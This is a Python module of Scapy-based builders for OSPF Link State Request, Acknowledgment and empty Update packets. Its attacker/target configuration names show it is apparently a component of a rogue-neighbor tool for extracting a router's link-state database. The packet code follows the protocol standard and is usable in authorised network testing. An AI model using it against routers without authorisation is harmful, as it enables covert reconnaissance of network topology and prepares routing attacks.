"""
Additional OSPF Packet Builders

Provides functions to build:
- Link State Request (LSR) packets
- Link State Acknowledgment (LSAck) packets

These complement the Hello and DBD builders in ospf_utils.py
"""

from scapy.all import  Packet, Raw
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether

from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_DBDesc, OSPF_LSReq, OSPF_LSUpd, OSPF_LSA_Hdr
from typing import List, Dict, Any
from config import (
    ATTACKER_ROUTER_ID,
    TARGET_ROUTER_IP,
    AREA_ID,
    ATTACKER_IP
)


def build_lsr_packet(lsa_headers: List[Dict[str, Any]]) -> IP:
    """
    Build OSPF Link State Request packet
    
    Args:
        lsa_headers: List of LSA header dicts (from parse_dbd or parse_lsu)
                     Each dict must contain:
                     - ls_type: int
                     - ls_id: str
                     - adv_router: str
    
    Returns:
        Scapy IP packet ready to send
    
    RFC 2328 §10.9: Link State Request packets are used to request
    pieces of the neighbor's database that are more up-to-date.
    """
    # Build list of LSReq entries
    # Each entry specifies: LS Type, Link State ID, Advertising Router
    requests = []
    
    for hdr in lsa_headers:
        # Create OSPF_LSReq entry
        # Scapy OSPF_LSReq format: type, id, adrouter
        req = OSPF_LSReq(
            type=hdr['ls_type'],
            id=hdr['ls_id'],
            adrouter=hdr['adv_router']
        )
        requests.append(req)
    
    # Chain all requests together
    # Scapy uses packet chaining: req1 / req2 / req3
    if len(requests) == 0:
        # Empty LSR (shouldn't happen, but handle gracefully)
        lsr_payload = OSPF_LSReq()
    elif len(requests) == 1:
        lsr_payload = requests[0]
    else:
        lsr_payload = requests[0]
        for req in requests[1:]:
            lsr_payload = lsr_payload / req
    
    # Build OSPF header
    ospf_hdr = OSPF_Hdr(
        version=2,
        type=3,  # Link State Request
        src=ATTACKER_ROUTER_ID,
        area=AREA_ID,
        authtype=0,  # No authentication
        authdata=0
    )
    
    # Build IP packet
    ip_pkt = IP(
        src=ATTACKER_IP,
        dst=TARGET_ROUTER_IP,
        proto=89,  # OSPF
        ttl=1
    )
    
    packet = ip_pkt / ospf_hdr / lsr_payload
    
    return packet


def build_lsack_packet(lsa_headers: List[Dict[str, Any]]) -> IP:
    """
    Build OSPF Link State Acknowledgment packet
    
    Args:
        lsa_headers: List of LSA header dicts to acknowledge
                     Each dict must contain all header fields:
                     - ls_type, ls_id, adv_router, seq, age, checksum, length
    
    Returns:
        Scapy IP packet ready to send
    
    RFC 2328 §13.5: Link State Acknowledgment packets are used to
    explicitly acknowledge receipt of LSAs.
    """
    # Build list of LSA headers for acknowledgment
    ack_headers = []
    
    for hdr in lsa_headers:
        # Create OSPF_LSA_Hdr
        lsa_hdr = OSPF_LSA_Hdr(
            age=hdr['age'],
            type=hdr['ls_type'],
            id=hdr['ls_id'],
            adrouter=hdr['adv_router'],
            seq=hdr['seq'],
            chksum=hdr['checksum'],
            len=hdr['length']
        )
        ack_headers.append(lsa_hdr)
    
    # Chain all headers together
    if len(ack_headers) == 0:
        # Empty LSAck (shouldn't happen)
        lsack_payload = OSPF_LSA_Hdr()
    elif len(ack_headers) == 1:
        lsack_payload = ack_headers[0]
    else:
        lsack_payload = ack_headers[0]
        for hdr in ack_headers[1:]:
            lsack_payload = lsack_payload / hdr
    
    # Build OSPF header
    ospf_hdr = OSPF_Hdr(
        version=2,
        type=5,  # Link State Acknowledgment
        src=ATTACKER_ROUTER_ID,
        area=AREA_ID,
        authtype=0,
        authdata=0
    )
    
    # Build IP packet
    ip_pkt = IP(
        src=ATTACKER_IP,
        dst=TARGET_ROUTER_IP,
        proto=89,
        ttl=1
    )
    
    packet = ip_pkt / ospf_hdr / lsack_payload
    
    return packet


def build_empty_lsu_packet() -> IP:
    """
    Build empty OSPF Link State Update packet
    
    Used when we need to send LSU but have no LSAs to advertise.
    In practice, this is rarely used since we don't originate LSAs.
    
    Returns:
        Scapy IP packet ready to send
    """
    
    # Build OSPF header
    ospf_hdr = OSPF_Hdr(
        version=2,
        type=4,  # Link State Update
        src=ATTACKER_ROUTER_ID,
        area=AREA_ID,
        authtype=0,
        authdata=0
    )
    
    # Build empty LSU
    lsu = OSPF_LSUpd(
        lsacount=0
    )
    
    # Build IP packet
    ip_pkt = IP(
        src=ATTACKER_IP,
        dst=TARGET_ROUTER_IP,
        proto=89,
        ttl=1
    )
    
    packet = ip_pkt / ospf_hdr / lsu
    
    return packet


